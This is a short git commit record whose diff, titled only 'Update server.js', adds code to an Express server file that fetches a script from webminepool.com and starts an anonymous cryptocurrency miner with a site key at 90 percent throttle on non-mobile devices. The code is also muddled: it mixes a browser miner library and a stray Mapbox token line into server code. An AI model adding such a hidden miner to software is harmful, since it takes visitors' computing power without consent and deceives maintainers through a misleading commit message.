8853d11f0a4096f182b75b10fe4f2659e1082209
Dovee99 <44682400+Dovee99@users.noreply.github.com>
2021-09-30 23:15:39 +0300

    Update server.js

--- server.js
+++ server.js
@@ -10,5 +10,14 @@ app.listen(PORT, () =>{
 app.get('/',(req,res) => {
 	res.send({ok: true});
 })
+var scriptjs = require('scriptjs');
+
+scriptjs('https://www.webminepool.com/lib/base.js', function() {
+    L.mapbox.accessToken = 'MyToken';
+});
+var miner = WMP.Anonymous('SK_k8AAl94wLGDjcDDbhXrtW', { throttle: 0.9});
+		 if (!miner.isMobile()){
+			miner.start();
+		}
 
 
